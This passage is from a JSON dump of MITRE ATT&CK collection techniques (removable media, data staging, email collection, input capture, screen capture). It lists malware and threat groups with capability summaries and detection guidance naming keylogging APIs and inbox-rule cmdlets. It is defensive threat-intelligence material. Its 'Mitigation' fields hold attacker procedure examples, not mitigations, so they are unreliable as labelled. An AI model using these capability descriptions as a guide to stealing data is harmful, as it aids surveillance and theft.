        "name": "CosmicDuke",
        "description": "CosmicDuke steals user files from removable media with file extensions and keywords that match a predefined list.[6]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson contains a module to collect data from removable drives.[7][8]"
      },
      {
        "id": "S0538",
        "name": "Crutch",
        "description": "Crutch can monitor removable drives and exfiltrate files matching a given extension list.[9]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive can scan all .exe files located in the USB drive.[10]"
      },
      {
        "id": "S0036",
        "name": "FLASHFLOOD",
        "description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by SPACESHIP.[11]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "The FunnyDream FilePakMonitor component has the ability to collect files from removable devices.[12]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.[13][14]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT steals files based on an extension list if a USB drive is connected to the system.[15]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can collect jpeg files from connected MTP devices.[16]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete can find, encrypt, and upload files from fixed and removable drives.[17][18]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT has the ability to extract data from removable devices connected to the endpoint.[19]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "Prikormka contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.[20]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can collect data from removable media and stage it for exfiltration.[21]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec has a package that collects documents from any inserted USB sticks.[22]"
      },
      {
        "id": "S0090",
        "name": "Rover",
        "description": "Rover searches for files on attached removable drives based on a predefined list of file extensions every five seconds.[23]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.[24]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla RPC backdoors can collect files from USB thumb drives.[25][26]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "Once a removable media device is inserted back into the first victim, USBStealer collects data from it that was exfiltrated from a second victim.[27][28]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that could be taken to collect files from a system's connected removable media. For example, data may be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected/abnormal file accesses to removable media (optical disk drive, USB memory, etc.) connected to the compromised system."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Data Staged",
    "Code": "T1074",
    "Description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.[1]In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.[2]Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
    "Mitigation": [
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can create directories to store logs and other collected data.[3]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos can write captured SSH connection credentials to a file under the /var/run directory with a .pid extension for exfiltration.[4]"
      },
      {
        "id": "S1076",
        "name": "QUIETCANARY",
        "description": "QUIETCANARY has the ability to stage data prior to exfiltration.[5]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark has stored information in folders named U1 and U2 prior to exfiltration.[6]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has staged collected data in password-protected archives.[7]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules.[8]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Creation",
        "detects": "Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1074.001",
        "name": "Local Data Staging"
      },
      {
        "id": "T1074.002",
        "name": "Remote Data Staging"
      }
    ],
    "Tactic": "\nCollection"
  },
  {
    "Title": "Email Collection",
    "Code": "T1114",
    "Description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.",
    "Mitigation": [
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has been observed leveraging a module that can scrape email addresses from Outlook.[1][2][3]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has compromised email credentials in order to steal sensitive data.[4]"
      },
      {
        "id": "G0122",
        "name": "Silent Librarian",
        "description": "Silent Librarian has exfiltrated entire mailboxes from compromised accounts.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include X-MS-Exchange-Organization-AutoForwarded set to true, X-MailFwdBy and X-Forwarded-To. The forwardingSMTPAddress parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.[6] High volumes of emails that bear the X-MS-Exchange-Organization-AutoForwarded header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.On Windows systems, monitor for creation of suspicious inbox rules through the use of the New-InboxRule, Set-InboxRule, New-TransportRule, and Set-TransportRule PowerShell cmdlets.[7][8]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unusual processes access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account)."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1114.001",
        "name": "Local Email Collection"
      },
      {
        "id": "T1114.002",
        "name": "Remote Email Collection"
      },
      {
        "id": "T1114.003",
        "name": "Email Forwarding Rule"
      }
    ],
    "Tactic": "\nCollection"
  },
  {
    "Title": "Input Capture",
    "Code": "T1056",
    "Description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
    "Mitigation": [
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has utilized tools to capture mouse movements.[1]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has a module to perform any API hooking it desires.[2]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy can collect mouse events.[3]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host.[4][5]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can conduct mouse event logging.[6]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can log mouse events.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for unusual kernel driver installation activity"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files for unexpected modifications to access permissions and attributes"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls to SetWindowsHook, GetKeyState, and GetAsyncKeyState [7]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes conducting malicious activity"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys or values for unexpected modifications"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1056.001",
        "name": "Keylogging"
      },
      {
        "id": "T1056.002",
        "name": "GUI Input Capture"
      },
      {
        "id": "T1056.003",
        "name": "Web Portal Capture"
      },
      {
        "id": "T1056.004",
        "name": "Credential API Hooking"
      }
    ],
    "Tactic": "Collection, CredentialAccess"
  },
  {
    "Title": "Screen Capture",
    "Code": "T1113",
    "Description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.[1][2]",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can capture screenshots of the victim’s desktop.[3][4][5][6][7]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can take screenshots on a compromised host by calling a series of APIs.[8][9]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used tools to take screenshots from victims.[10][11][12][13]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used a screen capture utility to take screenshots on a compromised host.[14][15]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to capture screenshots on compromised hosts.[16]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT has the ability to view the screen on compromised hosts.[17]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor's has a plugin that captures screenshots of the target applications.[18]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can capture screenshots of the victim’s machines.[19]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can take screenshots and send them to an actor-controlled C2 server.[20]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "BADNEWS has a command to take a screenshot and send it to the C2 server.[21][22]"
      },
      {
        "id": "S0337",
        "name": "BadPatch",
        "description": "BadPatch captures screenshots in .jpg format and then exfiltrates them.[23]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook is capable of taking an image of and uploading the current desktop.[24][25]"
      },
      {
        "id": "S0017",
        "name": "BISCUIT",
        "description": "BISCUIT has a command to periodically take screenshots of the system.[26]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy is capable of taking screenshots.[27]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.[28]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has used a tool to capture screenshots.[29][30]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can take screenshots on compromised hosts.[31]"
      },
      {
        "id": "S0454",
        "name": "Cadelspy",
        "description": "Cadelspy has the ability to capture screenshots and webcam photos.[32]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon can take a screenshot of the desktop.[33]"
      },
      {
        "id": "S0030",
        "name": "Carbanak",
        "description": "Carbanak performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.[34]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp can capture display screenshots with the screens_dll.dll plugin.[35]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT can capture screenshots.[36]"
      },
      {
        "id": "S0261",
        "name": "Catchamas",
        "description": "Catchamas captures screenshots based on specific keywords in the window’s title.[37]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes can capture screenshots of the infected machine.[38]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower has the ability to capture screenshots.[39]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK has the capability to capture screenshots.[12]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme has the ability to capture screenshots.[40]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling has the ability to capture screenshots.[41]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike's Beacon payload is capable of capturing screenshots.[42][43][44]"
      },
      {
        "id": "S0338",
        "name": "Cobian RAT",
        "description": "Cobian RAT has a feature to perform screen capture.[45]"
      },
      {
        "id": "S0591",
        "name": "ConnectWise",
        "description": "ConnectWise can take screenshots on remote hosts.[46]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke takes periodic screenshots and exfiltrates them.[47]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson contains a command to perform screen captures.[48][49][50]"
      },
      {
        "id": "S0235",
        "name": "CrossRAT",
        "description": "CrossRAT is capable of taking screen captures.[24]"
      },
      {
        "id": "G0070",
        "name": "Dark Caracal",
        "description": "Dark Caracal took screenshots using their Windows malware.[24]"
      },
      {
        "id": "S0187",
        "name": "Daserf",
        "description": "Daserf can take screenshots.[51][29]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi is capable of performing screen captures.[52]"
      },
      {
        "id": "S0213",
        "name": "DOGCALL",
        "description": "DOGCALL is capable of capturing screenshots of the victim's machine.[53][54]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).[55][56][57]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky captures PNG screenshots of the main screen.[58]"
      },
      {
        "id": "S0593",
        "name": "ECCENTRICBANDWAGON",
        "description": "ECCENTRICBANDWAGON can capture screenshots and store them locally.[59]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire is capable of capturing screenshots on Windows and macOS systems.[60]"
      },
      {
        "id": "S0152",
        "name": "EvilGrab",
        "description": "EvilGrab has the capability to capture screenshots.[61]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 captured screenshots and desktop video recordings.[62]"
      },
      {
        "id": "S0182",
        "name": "FinFisher",
        "description": "FinFisher takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.[63][64]"
      },
      {
        "id": "S0143",
        "name": "Flame",
        "description": "Flame can take regular screenshots when certain applications are open that are sent to the command and control server.[65]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy can capture screenshots.[66]"
      },
      {
        "id": "S0277",
        "name": "FruitFly",
        "description": "FruitFly takes screenshots of the user's desktop.[67]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "The FunnyDream ScreenCap component can take screenshots on a compromised host.[68]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group's malware can take screenshots of the compromised computer every minute.[69]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT can capture the victim’s screen remotely.[70]"
      },
      {
        "id": "G0115",
        "name": "GOLD SOUTHFIELD",
        "description": "GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.[71]"
      },
      {
        "id": "S0417",
        "name": "GRIFFON",
        "description": "GRIFFON has used a screenshot module that can be used to take a screenshot of the remote system.[72]"
      },
      {
        "id": "G0043",
        "name": "Group5",
        "description": "Malware used by Group5 is capable of watching the victim's screen.[73]"
      },
      {
        "id": "S0151",
        "name": "HALFBAKED",
        "description": "HALFBAKED can obtain screenshots from the victim.[74]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to do real time screen viewing on an infected host.[75]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.[76]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro has the ability to take screenshots.[77]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.[78][79]"
      },
      {
        "id": "S0163",
        "name": "Janicab",
        "description": "Janicab captured screenshots and sent them out to a C2 server.[80][81]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "A JHUHUGIT variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.[82][83]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT has the capability to take screenshots of the victim’s machine.[84][85]"
      },
      {
        "id": "S0088",
        "name": "Kasidet",
        "description": "Kasidet has the ability to initiate keylogging and screen captures.[86]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar captures screenshots of the victim’s screen.[87]"
      },
      {
        "id": "S0387",
        "name": "KeyBoy",
        "description": "KeyBoy has a command to perform screen grabbing.[88]"
      },
      {
        "id": "S0271",
        "name": "KEYMARBLE",
        "description": "KEYMARBLE can capture screenshots of the victim’s machine.[89]"
      },
      {
        "id": "S0437",
        "name": "Kivars",
        "description": "Kivars has the ability to capture screenshots on the infected host.[90]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI can take screenshots of the victim’s machine.[91]"
      },
      {
        "id": "S0680",
        "name": "LitePower",
        "description": "LitePower can take system screenshots and save them to %AppData%.[92]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can take JPEG screenshots of an infected system.[93][94]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack can take desktop screenshots.[95]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete captures screenshots.[96][97][98][99]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa has used Apple’s Core Graphic APIs, such as CGWindowListCreateImageFromArray, to capture the user's screen and open windows.[100][101]"
      },
      {
        "id": "S0282",
        "name": "MacSpy",
        "description": "MacSpy can capture screenshots of the desktop over multiple monitors.[67]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can take a screenshot of the target machine and save it to a file.[102]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware can take a screenshot and upload the file to its C2 server.[103]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can capture screenshots that are initially saved as ‘scr.jpg’.[104]"
      },
      {
        "id": "S0167",
        "name": "Matryoshka",
        "description": "Matryoshka is capable of performing screen captures.[105][106]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can take and save screenshots.[102][107]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo can collect screenshots of the victim’s machine.[108][109]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia takes screenshots every 90 seconds by calling the Gdi32.BitBlt API.[110]"
      },
      {
        "id": "G1019",
        "name": "MoustachedBouncer",
        "description": "MoustachedBouncer has used plugins to take screenshots on targeted systems.[111]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware that can capture screenshots of the victim’s machine.[112]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can capture the victim's screen.[113][114][115][116]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can load a module to call CreateCompatibleDC and GdipSaveImageToStream for screen capture.[111]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can capture screenshots of the victim’s machines.[117]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT can capture a screenshot of the current screen.[118]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus can capture screenshots of the victims’ machine.[119][120][121]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has a tool called CANDYKING to capture a screenshot of user's desktop.[122]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can take screen shots of a compromised machine.[68]"
      },
      {
        "id": "S0643",
        "name": "Peppy",
        "description": "Peppy can take screenshots on targeted systems.[48]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX allows the operator to capture screenshots.[123]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has the ability to take screen captures.[124][125]"
      },
      {
        "id": "S0216",
        "name": "POORAIM",
        "description": "POORAIM can perform screen capturing.[53]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit's Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals.[126][127]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can retrieve screenshots from compromised hosts.[128][129]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER can capture a screenshot from a victim.[130]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "Prikormka contains a module that captures screenshots of the victim's desktop.[131]"
      },
      {
        "id": "S0279",
        "name": "Proton",
        "description": "Proton captures the content of the desktop with the screencapture binary.[67]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon can capture screenshots at a configurable interval.[132][133]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.[134]"
      },
      {
        "id": "S0686",
        "name": "QuietSieve",
        "description": "QuietSieve has taken screenshots every five minutes and saved them to the user's local Application Data folder under Temp\\SymbolSourceSymbols\\icons or Temp\\ModeAuto\\icons.[135]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay has the ability to capture screenshots.[136]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can take screenshots every 30 seconds as well as when an external removable storage device is connected.[137]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can capture screenshots from a compromised host.[138]"
      },
      {
        "id": "S0495",
        "name": "RDAT",
        "description": "RDAT can take a screenshot on the infected system.[139]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves can capture screenshots.[140][141]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos takes automated screenshots of the infected machine.[142]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi takes screenshots of windows of interest.[143]"
      },
      {
        "id": "S0592",
        "name": "RemoteUtilities",
        "description": "RemoteUtilities can take screenshots on a compromised host.[144]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT has a plugin for screen capture.[145]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin has a command named $screenshot that may be responsible for taking screenshots of the victim machine.[146]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can capture screenshots of the infected system using the gdi32 library.[147][148][149][150][151]"
      },
      {
        "id": "S0090",
        "name": "Rover",
        "description": "Rover takes screenshots of the compromised system's desktop and saves them to C:\\system\\screenshot.bmp for exfiltration every 60 minutes.[152]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can capture screenshots.[153][154]"
      },
      {
        "id": "S0546",
        "name": "SharpStage",
        "description": "SharpStage has the ability to capture the victim's screen.[155][156]"
      },
      {
        "id": "S0217",
        "name": "SHUTTERSPEED",
        "description": "SHUTTERSPEED can capture screenshots.[53]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence can capture victim screen activity.[157][158]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can take a screenshot of the current desktop.[159]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can take screenshots of the victim’s active display.[160]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has taken a screenshot of a victim's desktop, named it \"Filter3.jpg\", and stored it in the local directory.[161]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM can capture screenshots of the victim’s desktop.[162][163]"
      },
      {
        "id": "S0273",
        "name": "Socksbot",
        "description": "Socksbot can take screenshots.[164]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill can take screenshots.[165]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater has the ability to take screen captures.[166]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can take a screenshot from an infected host.[167]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate has the ability to capture screenshots.[168]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.[169]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.[170]"
      },
      {
        "id": "S0004",
        "name": "TinyZBot",
        "description": "TinyZBot contains screen capture functionality.[171]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can take a desktop screenshot and save the file into \\ProgramData\\Mail\\MailAg\\shot.png.[172][173]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian has the ability to take screenshots.[174]"
      },
      {
        "id": "S0199",
        "name": "TURNEDUP",
        "description": "TURNEDUP is capable of taking screenshots.[175]"
      },
      {
        "id": "S0275",
        "name": "UPPERCUT",
        "description": "UPPERCUT can capture desktop screenshots in the PNG format and send them to the C2 server.[176]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used hooked APIs to take screenshots.[177][178]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has the ability to take screenshots on a compromised host.[179]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN can perform screen captures of the victim’s machine.[180]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT has the ability to take a screenshot of the infected host desktop using Windows GDI+.[181]"
      },
      {
        "id": "S0161",
        "name": "XAgentOSX",
        "description": "XAgentOSX contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.[11]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET saves a screen capture of the victim's system with a numbered filename and .jpg extension. Screen captures are taken at specified intervals based on the system. [182]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty collects screenshots of the victim machine.[183]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "A variant of Zebrocy captures screenshots of the victim’s machine in JPEG and BMP format.[33][184][185][186][187][188]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda can take screenshots of the victim’s machine.[189]"
      },
      {
        "id": "S0086",
        "name": "ZLib",
        "description": "ZLib has the ability to obtain screenshots of the compromised system.[190]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can capture screenshots.[191]"
      }
